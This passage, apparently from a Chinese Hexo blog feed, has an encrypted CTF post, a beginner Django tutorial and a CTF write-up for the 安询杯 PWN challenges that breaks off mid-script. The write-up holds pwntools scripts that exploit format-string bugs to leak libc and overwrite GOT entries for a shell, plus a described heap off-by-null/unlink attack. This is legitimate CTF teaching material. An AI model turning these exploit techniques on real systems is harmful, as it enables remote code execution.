35fae982101541135d58b99778998730cce0ec128e3987272d6e399913c5765afa31c0d79d0f92fd2563bb2d45c47c69a5c76652a8c52e4dd865783f1aa15dcc37a94cce7eb514fe3026ee4e237f945ebf1f623990242c0e618d68536788df2f75fb9050535fa7816387b263395d7551ad2350ab05b1a2a68682fd7f093330d4a5fb332852891c3154724816ce4b6c0673fe07350962d10f4b08c8b2c2a2958fbdcc92ec4c06d8a327077496e19833f757db9129e2a90d1f7349b8f54b0d179e960af25da3c675c9339a72a7a697db3b514a65e025b198a0db0793a6c3b4c142cfccc3c10e47d038295f402606ec366017809f0079032b278970f5ff9bac713fc180e51c6f35b8774942dd54fcbc845012a24cdcdc2959c4fd93d496b0c4f89cbaba344c3fbd604b0ef7c0bce2d57dddc196ebac538fefba024a63210146339e75ce219bba2e4cd2da754b78e7b9a9510b226737bfcef0fa7ceb3e1b2628ef8a1a850ec76d63578dca913a5769de499060a466e4494cef5f75a83e49efe3a1d40b211bc4fd714c71f36ee12233c7d1da10d3b366541847d0f9c92e5c706ef1ef29381e798199f23fd0e8548220503f6c39511fd61da64a1977989407edc9157e877c49f1f7ac6cf7f1f8176b203bd9dc3bac9967f68ddf68e39718b2942f3c572eb12b7dc4374bcd4f22e79ad825c3d4facf5fe54ade385e0daffe8b4ab08924886f9ddde498d97ca110f0282674a2731c57808d7ef0a7858eb510f90b9b232ec9694b321d134a998ff61e423bfad5364f7e9cdc446f5a5c3dee6cf6b4dabe43d8e9908da046be45ef3407b2f3bd2116798bca003759e35a0a9a6e0c2e39ab480c0a403371e7c0e283fa6cad90245896234242d636b29d75817f99c3487c5821ede76a59ecaaf04b2c885c385246b82319d97322411b62c476a2dad4a880a314657f59cf5009e293f460325564464f20553f5b84f880c368d040e128809bcb62d82197f450f68a2f012879ebecd708c95d39e61d67c6f51731abd770b83c957a274c12bc6872f4d37a566d493cdff23f9bd9a977d176de27d4df8bbcf9c7f47dd8c332248c004009a2232d7a685a8c30d97761f919ecd0ef0ea6446598ab0486feb1bee11392d4f4158c211834beeded75d0c4fc13ba79895dcd06c3e50d3ccca150c1258267820f6c360cdcf3faa0760269f89850180b9e00afe84e4e9468897ca02ef22e657bf13a7a01b6217225ecbf25d7e1a20308047c6222bd9e961e127b9375010fc6a9fcb58ef4eb7a2e52b592a514cca3c5ef7a0a189b444c04adeea4226c7259be5a18eb55982fced31afc0a1f8f814061bb9ef5f1ad049a13a635bc70233941674b4df129e48daf26079e91d05052d8390e2d1f58e1c4ab5273e157e8904faddb827401ca84f74eb41da88c1e630ccbcf7e8068e8f11b48303a03d5d78b6b9a523c4a393c0325c8bc541d542a6dbd5083a44a3f221a9cc058fe8fd09d187d8a1b53f738d38dcb59f56f0e454a3dc1f2b3722dc417af03270a12ef74a821213c54d276c3b3cc2ea3f3f21c4c7cda8adc9f258d9abd592d43670053d30d4342be9b739113b0c552e60734b94815933636f14894ba71098f6a05e215f58ef72c113e58cce4431d9ed079db81651cf5ed7cb13cc613fc16f1f7f37b826a2fccc4172606bb4758ab4760684d66db3e7126d7c77b1e42a473436f4537ad1068ba00d8268fa1d450d1c8cf117a6fe951d1c1a4ddd6be943bbae7a62e4d84493dd820b14ade50ca53b6ba9ad881df0a79a0c3c9a132d349f58c514b79916ddc98d4471d1a7a5617ae232ffa4293b4723a54ba87845d6e35a6e44ef8c5902df1e94cfe2b97fb15113b88739f093724b2c3041b43a4032b8352ff3d33579a82e27644fc8161b81ba1f9f4d1c918baffddad6ffd75f65fc216664e6f4f742d90c2c24d08fd9fcff82dc80a79efb54a7136468df66cdd94440cd17c6ef5de3978cbcee3f5032f246d6f48c3cec79fd6bf6ce934b5ca3af8e12c923914393afd6f990c70994f9f6629655ad29704398edad30a8622563c348c7512141e11a6fa1be0e703f1b2801041a71ee481a8b2004e7935ce93dbf179b7b65e2541aa518a58cadb8d01fb8d6e35045bb72798156793426a2d64683232fc8927600fbf46b64d6899072339074daab6a881ed0b6a68f8ea11a7b47965be126593b846f94e96f0c68380cea174aca1d8e584a48624e6e85c4b19762ccdcbd9d55bf7f2f651fc116e7306b437ba1eb4773aadfde3130356d6b564c2415af85dd287f85d8418a13fa0d24c443c194b402e0bce49b9497bcb47a6401e0262073de72d0d38841fa82b05229fd34a084392a6bcc625ad171bc952ec80cc14032f4af2779eda2c9badeb4a3f66178a628477b794d92b6a26a265a9d1ba278ed64193eb201f9c5cc8244c7426934c808da4719cc807d36e278e431152032323a6e20d97ab201efc8e7ec5b9b0fa82f633bcb99a64a8f925c08bf8c310bcf6cede54178b7952964b475ac9d1e9c5646280675df3922cb0c018ad70b2619916372489aa1d94e532afffdde92ad4fd3e507ca72b5a83d4db35b39b891ceb301772db6deba4b1ca0c265692fd55261a81ceffb764230f4cebbbfba17787c54dfa57578c807e5e6e91adaf8c21e91a9d1b665c636e6992dca13140f0d9d4ecf5e15c213815619daac0bc1249529006a43135018548b1a0a6988211849ff9b9321ca71198d71af8419491181328719b7f40547bc4e1de343c89643f06111fdc8771b17b4caee07c0037a994a91897c9d31f12e201d91cd4b377c317dfe554a723736ccf78d41b068a9564462cb4c8d9d583f453790e588b383cc938b64a2a29aa1cac01c0749c47bb66ad99ad06256b21be9ead0ae3e4bb8de83d9570fcd000c145271076ef9e39871d8d8fbfd150568de92c531c8af8109ded1db4998899151149922ef89b366a082cf05c9aed2c483f3c66ae869114a72ecf5b4b033741f75b295e76433b555285d074ed819031ca179d611310a7fc16bf5e22bdf681fbe50895f74603fd595a3c7d0577f04d79a53a2b312d0bef1f375bc178d31bcf4f7d662713ce39f0885ee0b480b390abcf037a1815eda3320362b4130dc524a2378514a86609428c185a63cdcc88590ee05b424eb90b597148721fcc3de91b88d61878f0401222bd998de7359b0952e4e37f98e04742d8d9b5a41fe16505b49d5187cdb7cc5995bddd7eb8ca155a4fe2cb47a90ba80280bb074747b741ade96f2ce4863b690675a8ee3c3e8901e13e85057b184cd23b9f528aed88ff93efbc6f7a0a3010301bfecf3c8797292eaff544154e1748784ab79364eb751587f7a18bdcc0f12a8ed3ee1af36e989fcb2f4f5a01fd8823c80bb3b149444b93fb2c7bc4df80a6e0d2e345725b5a6da2c8be33d7330a3e95dec0197c78685027e8940e1e22b760ad7f780eca34b27aca903dbdb40f22f0697f2501636f2a36b2b062bd83b7e3cabe67bb514c4a22451db5e39a508fbe7149ef64ed7458e72606fe2abcf98bbd1bcb6a8b21cab78e556e14636084d19f899d1afa1251968b4bf0d9717e5964bd9da2453e3ffe042e5c87fe103d5d9d015570803842870648d6782daef1318e2dcd46082d8709875640a7a998d0cdbdaae30409180c44f101c19fe85139f395d76fbccd0d487633b89e107a0dd7b77365df022b9db63cbbb651a2fa038cdbb440040fbfe059cd30637e2a205e4754f20b485dfa14d7d603417d4382d7b74e58a8fea74ca9c6e57e3212709c56391c556699e12d3138e07232dd29cb71aca4f221bf14922b12ec68004c61e95136975bee2bba280382cd7d05797049c6425e1000b4d5ef9b748e192b89498120c4c2adf99932b3b98c180700c0bab3c4bd59c78f21b69028d49970c157dfbba602d253cf0ea792dfe5a9ea762c90046cb519bbfc36f8e3c4e94fc99498ecac91021e4f6ad2e7a1de859a8d4795a63c09cea425b8352679c05a8f5fc11db1dab4be79fecd39de97f6b05dcf4fe5ba63c31abd7f5304db3bc0e02e47964c3ac3f36ffa26f2363340e1be586bfae51d035da5e3fff7937c8ce2e51cf50515f4db8a58a1102b83e0deb74bd124165d61bf3dbba3e1dfa8b3c73d0b6e2cfa7b854d607bf1e78fb8e0a955066e6785cd949dfaf8828de85b843466bf17dc64935d1e3a70092d00d5c9951ebf83238aeac996c5762eb3b2d1581d90234379a739050b79cbfa11fbd251aceb3811a399c25bde318015354970cd01610398f64b3f213a2df06cbc8d68dca8c3192cc95b1832adc2690d5be29389dee21aa4a57bf044719fc41331ac801cf210b1a435a892ce52ce279445a097568489aa16190a7b8e6f315983460e4a9e98604dd3edc062e02023c103ec28d48ba03450f88f4d3999559cbd83c4281bb66b5db818064099b5828d7e6c7dfc1e260696508dbe534cebe41de18639a570fbd92d42af80e22835a443feded00b22adf1336c3e4246a6bee8ab221aa718dedbc594536fa265593b97002dc0f2f718a720dddb8389a787d51acc77ec6b4d14e75bd210903aba3dc4c4fe7460730c0db71c7e08b4f780c152699b14a46d284858696075bd52d6721742dca2225004ecf9aba96b1730376d4a3be1775e07d16127e036d14655c327be4c723ee88211b0e120a2f0507dbd25c7e20f8425f897d854092b9935d2f91c64eca0715e4f00fffca3cc739204af9834f320cb02b37f423cfc411fd08f34b29dbced0730e42b91150988ccdf977ca4c6f66912e70323dec220abae94cecb8884df3cead3002f065a7abb4b1264d85b815fb2b7f62ad2507be2849afca38c6b5b4ed658325f3999ecfdb3fd0470141075bf9acd63f794aa688aa53affa043edbac8cbf213defcbc5c549288b003119b06d8d1f9d4cce5d51a698ef4849a8d158104b2f0b3405bbdf3b78fef167f5f6e0f0e354f5f13b7c1ff426d0e24e4eea12a60cfdf1786013a67bf2507b33fb50cf52a41361ac8302e722d1376dea8f5361160157774c7bb797e658f05d2c4994b043bd6fe0a0f996ce5ed489aceb381f114eff477c7769dcb641e811049b4cb381dd6582861b3b746c4d46c1a5441b29ca8c3d031e5f5df17ea18bbac26d742d56e6fce8653f7dc930279ea6e30f24d12247bb3e44a9ad922743b5846f3135a5c5d898e2815715c1a6685b47a14a169eba9ec81567a0d9c80e58dcdf8df57df3e060b79048c84334866a5e885aa0f8b78046949937d48c0b8862812277e4eb96829dd700e4e9e299d561be0191b959fa205a1f102e1ed24b49bb03124c604fc8588dabf13faee011532afc443ea55c94a7febba15209b1ac7306ab63f023f514d86d01b37f8c05382b94d4b7f68b26a5b6867a4ff43861464fc2ab0c0dd72ecb0ef30bbda66d26ebf43bc33b9e429d948822371aefea3ef85992b0b28a23f38ca072d08f2e0ada6e70e577cda7d2520cc925e3098525ea18e24f8f4726939e99e7602888709d0b60a286475d7712a64fd652a3073b0a166d0c6c74f3eae41ad990b03030b4bcdd95b4ae9bcea4c696909ba55d361dbc29b61fb6888cde833d115bd566a50b6b0edbd84efc31304c4825771cc11361282b770771c32cdf24b033b2280d2f1cbb78f46b9f24655cefd8220e23034d27fafdf35b01c3b56abd65bc2499a73007ddc9b782e6a6e4cb9b32e91208395482c8d92ecc541f9fa95072891128f8b8844d3db8188fd1b560622517248f04fa2ef36d1b4c2966a31e1b946c1feb3e83e294fa64d2ad17f9f40252f50f5417e330e113fcda51444b41ef3bba2cf253fb4033824e68c343f886de0dc48c52d7d091f8ad59ac862645fa91d8b6fbcb3f4f6060b0e147b46d23592fb2b845046c6231ce46cb5d01883d334aab096691fcd9bca762161dbbae40bb65e43f29f7d486107a60901c5ec07de28e4104642b6936b9fa2cdba269c617b15ffacc9c0026b39990fe3c8b2fd98101e83e14ede4100f115be9e4e4fb89eaf836a983f844f5681a509ded3e1064ab87bd4c836b31d151d52c57bc45395f5e5ba54419a38e1a63ec8173dd347096504824ee175eee9890d7e2abab7cf16fb644ff933bf824062bf7402dac867cf84006269bdeae668429e27ae75d9d53cf2259b0b2f33eda10c9ceab8082042c55847ffe067afb08e3d4fb1acd2ac1ea13863602c5075d30c0a6ee6dba7dcdf116d58c3070c1b0b3127afa34ec94e20b741c36a87b723b27e167d62c228f50b3cf3d43eab62c20c71231279cb483d2d7802664d31410a0d6b3743b6c36adf7962a5b2a0c06a27a737ed0cf690876969eedcc8e2e4a3403016f7c3c951183c4715596f1772d9a7f8494562478bcb6d890757d4e4a988adf48a3e47ebe9a3253554e5c27ddab106857dd211ac0f428fb6b1342e4efc3945a450442620e24260dcc8c183f135f982e8286b42aa313f3daa0a429578774b2640bc2cc43f15b3acdb7432d80606e185c6a50845a54fb6f9892e033f9fce952f2533cfbafaa0079de9d95ac2021713c54a767af1bf626c03d5ad6a8631a2e7c67e5ff5b01cdc7d5f31209c569757c0caaa51bc90e741e33b31a7da887dc4589dc52ba13351c40c55c902bdb2e7df8384a3d1b162dc4f7095af9fcf39b51761cad920692ef5bfdfa063072bbdf8c27206b72ffa83e67cbdbbc5bd053c61e067694e2aadabd8c77d6726be5fdb5a9c0c3dd521dc90b68bede9796f2c7b47560e1b304d74f620afac7bb602f3c1dd5683d0783875b9824c92ac8603fd5a565e1840c558dd5dc631cbe0898b9b48b0af819df08e3ea96a0dd68844b671692ebe7066e2ddc6304386071c940c2b8ddcf5cab3e48fe9b9b388162412c851c15c6686962c86450710e021faced5af404faf6f206a55051d66f5cee9222af9264ef0b350384e1f934807f54dda2394f54e72de0234fbed1a13680d66598545463fd6bdab54c5b50f55d22b88ffdacc0574a31d70acb5ded812870437a8166fc74000646a97b861699484cf1d34914f24d49df27fbe50edc526e5cabc905b122de25604b193a7890f20b4bf1be010f5aa67920fb40a7c09d1c53b88e8c3f7c4402b090f344dc745d9eec0eafabb9c46d3bf6adf7b152c704b63564e2a3fb7d4e63254829544b77b4dd7956bf80a6f740836360c8bb2c8977e15e63bde33aa6893228e210d260bd095</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MIPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django开发入门</title>
      <link href="/2019/12/22/Django%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
      <url>/2019/12/22/Django%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Django开发入门"><a href="#Django开发入门" class="headerlink" title="Django开发入门"></a>Django开发入门</h1><hr><h2 id="一、首先了解一下Django的结构"><a href="#一、首先了解一下Django的结构" class="headerlink" title="一、首先了解一下Django的结构"></a>一、首先了解一下Django的结构</h2><h2 id="我们使用pycharm创建一个django项目，然后发现有以下目录文件"><a href="#我们使用pycharm创建一个django项目，然后发现有以下目录文件" class="headerlink" title="我们使用pycharm创建一个django项目，然后发现有以下目录文件"></a>我们使用pycharm创建一个django项目，然后发现有以下目录文件</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__init__.py(初始化一些东西)</span><br><span class="line">asgi.py</span><br><span class="line">setting.py(在开发过程中里面有很多配置需要添加)</span><br><span class="line">urls.py(类似于spring的@controller)</span><br><span class="line">wsgi.py</span><br></pre></td></tr></tbody></table></figure></div><h2 id="view的创建"><a href="#view的创建" class="headerlink" title="view的创建"></a>view的创建</h2><h3 id="输入以下指令可以创建一个app-name"><a href="#输入以下指令可以创建一个app-name" class="headerlink" title="输入以下指令可以创建一个app_name"></a>输入以下指令可以创建一个app_name</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp app_name</span><br></pre></td></tr></tbody></table></figure></div><h3 id="这里我创建一个login"><a href="#这里我创建一个login" class="headerlink" title="这里我创建一个login"></a>这里我创建一个login</h3><h5 id="login目录下urls文件"><a href="#login目录下urls文件" class="headerlink" title="login目录下urls文件"></a>login目录下urls文件</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path('',views.index,name='index')</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></div><h5 id="login目录下view文件"><a href="#login目录下view文件" class="headerlink" title="login目录下view文件"></a>login目录下view文件</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"># Create your views here.</span><br><span class="line">def index(request):</span><br><span class="line">    return HttpResponse("Hello World!")</span><br></pre></td></tr></tbody></table></figure></div><h5 id="然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app"><a href="#然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app" class="headerlink" title="然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app"></a>然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from django.urls import path,include</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path('admin/',admin.site.urls),</span><br><span class="line">    path('index/',include("login.urls"))</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></div><h2 id="最终效果："><a href="#最终效果：" class="headerlink" title="最终效果："></a>最终效果：</h2><h4 id="控制台输入-python3-manage-py-runserver-然后输入http-127-0-0-1-index-就可以看到Hello-World-了"><a href="#控制台输入-python3-manage-py-runserver-然后输入http-127-0-0-1-index-就可以看到Hello-World-了" class="headerlink" title="控制台输入 python3 manage.py runserver 然后输入http://127.0.0.1/index/就可以看到Hello World!了"></a>控制台输入 python3 manage.py runserver 然后输入<a href="http://127.0.0.1/index/就可以看到Hello" target="_blank" rel="noopener">http://127.0.0.1/index/就可以看到Hello</a> World!了</h4></body></html>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-安询杯-19年12月</title>
      <link href="/2019/12/01/CTF-%E5%AE%89%E8%AF%A2%E6%9D%AF-19%E5%B9%B412%E6%9C%88/"/>
      <url>/2019/12/01/CTF-%E5%AE%89%E8%AF%A2%E6%9D%AF-19%E5%B9%B412%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="安询杯-PWN-WP"><a href="#安询杯-PWN-WP" class="headerlink" title="安询杯 PWN WP"></a>安询杯 PWN WP</h1><h2 id="前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了"><a href="#前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了" class="headerlink" title="前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了"></a>前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了</h2><h2 id="0x1-fmt32-SOLVED-working-咲夜南梦"><a href="#0x1-fmt32-SOLVED-working-咲夜南梦" class="headerlink" title="0x1 fmt32 | SOLVED | working : 咲夜南梦"></a>0x1 fmt32 | SOLVED | working : 咲夜南梦</h2><hr><h3 id="leak脚本用wiki的就好了，可以dump出文件"><a href="#leak脚本用wiki的就好了，可以dump出文件" class="headerlink" title="leak脚本用wiki的就好了，可以dump出文件"></a>leak脚本用wiki的就好了，可以dump出文件</h3><h3 id="然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one-gadget来拿到shell"><a href="#然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one-gadget来拿到shell" class="headerlink" title="然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one gadget来拿到shell"></a>然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one gadget来拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">'''</span><br><span class="line">0x3a80c execve("/bin/sh", esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line">0x3a80e execve("/bin/sh", esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line">0x3a812 execve("/bin/sh", esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line">0x3a819 execve("/bin/sh", esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">0x5f065 execl("/bin/sh", eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line">0x5f066 execl("/bin/sh", [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br><span class="line">'''</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">printf_got = u32(sh.recv(4))</span><br><span class="line">libc = printf_got - 0x049020</span><br><span class="line">system = libc + 0x03a940</span><br><span class="line">free = libc + lib.symbols['free']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014 + 4 * 5))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A030))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">sprintf = u32(sh.recv(4))</span><br><span class="line">one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="line">log.success("sprintf: " + hex(sprintf))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("printf: " + hex(printf_got))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">payload  ='aaaaa'</span><br><span class="line">payload += fmtstr_payload(9,{0x804A014:one_gadget[0] + libc},write_size = "byte",numbwritten = 0xe)</span><br><span class="line">sh.sendlineafter("me:",payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-fmt64-SOLVED-working-咲夜南梦"><a href="#0x2-fmt64-SOLVED-working-咲夜南梦" class="headerlink" title="0x2 fmt64 | SOLVED | working : 咲夜南梦"></a>0x2 fmt64 | SOLVED | working : 咲夜南梦</h2><hr><h3 id="nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样"><a href="#nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样" class="headerlink" title="nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样"></a>nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sprintf_got = 0x601058</span><br><span class="line">payload = '%9$sAAAA' + p64(sprintf_got)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sprintf = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = sprintf - lib.symbols['sprintf']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">system = libc + one_gadget[0]</span><br><span class="line">payload = ''</span><br><span class="line">payload += '%' + str((system % 0x10000) - 9) + 'c%12$hn'</span><br><span class="line">payload += '%' + str(((system >> 16) % 0x10000) - (system % 0x10000)) + 'c%13$hn'</span><br><span class="line">payload += '%12$s'</span><br><span class="line">payload = payload.ljust(0x20,'\x00')</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + 2)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x3-heap-SOLVED-working-咲夜南梦"><a href="#0x3-heap-SOLVED-working-咲夜南梦" class="headerlink" title="0x3 heap | SOLVED | working : 咲夜南梦"></a>0x3 heap | SOLVED | working : 咲夜南梦</h2><hr><h3 id="典型的off-by-null-unlink，通过printf来实现pie-leak和libc-leak，然后unlink修改chunk-list为-free-hook-然后写入system和binsh，然后free一下即可拿到shell"><a href="#典型的off-by-null-unlink，通过printf来实现pie-leak和libc-leak，然后unlink修改chunk-list为-free-hook-然后写入system和binsh，然后free一下即可拿到shell" class="headerlink" title="典型的off by null+unlink，通过printf来实现pie leak和libc leak，然后unlink修改chunk_list为__free_hook,然后写入system和binsh，然后free一下即可拿到shell"></a>典型的off by null+unlink，通过printf来实现pie leak和libc leak，然后unlink修改chunk_list为__free_hook,然后写入system和binsh，然后free一下即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 